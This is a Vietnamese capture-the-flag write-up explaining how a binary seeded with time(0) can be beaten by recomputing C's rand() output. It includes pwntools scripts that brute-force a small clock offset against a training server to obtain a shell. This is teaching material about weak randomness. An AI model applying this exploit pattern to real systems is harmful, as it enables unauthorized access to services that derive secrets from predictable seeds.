## Pseudo-Random Number Generator
[Writeup tham khảo](https://pwnn.me/blog/randvuln/)

Bản chất của máy tính chỉ có thể tính toán chứ không thể làm việc như đoán số. Vì thế có những thuật toán để tạo các số ngẫu nhiên giả qua công thức.
Trong C seed được nạp vào `srand()` và sinh số qua `rand()`

<img width="522" height="217" alt="Screenshot 2026-10-15 114051" src="https://github.com/user-attachments/assets/c3442b70-efdb-4e5e-8270-4db47773f71d" />
<img width="375" height="95" alt="Screenshot 2026-10-15 114116" src="https://github.com/user-attachments/assets/389fc089-ac42-4abc-82ee-da5c2b61a11a" />

Như chương trình trên vì chạy 2 lần với cùng 1 seed sẽ đưa về cùng kết quả. 

Vậy nếu một chương trìng sử dụng `rand()` để tạo số ngẫu nhiên thì ta hoàn toàn có thể tái tạo lại số đó nếu có cùng seed.

## bad_seed_1

<img width="827" height="527" alt="Screenshot 2026-10-15 111914" src="https://github.com/user-attachments/assets/91f9a85b-77e6-46e5-b7ab-fcf23bfd0930" />

Chương trình này sẽ cho ta shell nếu ta nhập v5 trùng với v6. Hãy xem v6 được tạo ra thế nào:

  `v3 = time(0)` dùng để lấy thời gian hiện tại của hệ thống tính bằng số giây kể từ mốc Unix Epoch (00:00:00 ngày 01/01/1970 theo giờ UTC).

  `srand(v3)` là lấy giá trị biến v3 làm seed để sinh số ngẫu nhiên.

  `v6 = rand() % 10000 + 20230000` sẽ lấy số ngẫu nhiên giả tạo từ `rand()` rồi tính toán gán vào v6.

  Như đã nói trước đó, ta có thể tái tạo số y chang nếu sinh số với cùng seed.

## Script Python LOCAL
  
    #!/usr/bin/env python3
    from pwn import *
    from ctypes import CDLL
    libc =CDLL("libc.so.6")

    p=process('./bad_seed_1')
  	seed = libc.time(0)                     
  	libc.srand(seed)
  	payload = libc.rand() % 10000 + 20230000
  	p.sendline(str(payload).encode())

    p.interactive()

Nhưng ở đây có điều cần lưu ý: time(0) của server có thể lệch vài giây do có độ trễ.

Vì thế ta sẽ cần duyệt độ trễ trong 1 khoảng thời gian để bao quát hết sai số này.

## Script Python SERVER

    #!/usr/bin/env python3
    from pwn import *
    from ctypes import CDLL
    libc =CDLL("libc.so.6")
    
    for i in range (-5,5):        // Duyệt độ trễ trong khoảng -5 đến +5 giây
    	p=remote('pwn-bad-seed-1-4be529f7f7bb.training.bksec.vn',1337,ssl=True)
    	seed = libc.time(None) + i  // Cộng thêm độ trễ vào seed
    	libc.srand(seed)
    	payload = libc.rand() % 10000 + 20230000
    	p.sendline(str(payload).encode())
    
    	try:
    		p.sendline(b'echo ABCD')
    		p.recvuntil(b'ABCD')
    		break
    	except:
    		try:
    			p.close()
    		except:
    			pass
    
    p.interactive()

<img width="1167" height="557" alt="Screenshot 2026-10-15 111624" src="https://github.com/user-attachments/assets/8a677566-9877-4932-bd5a-7b2993293801" />
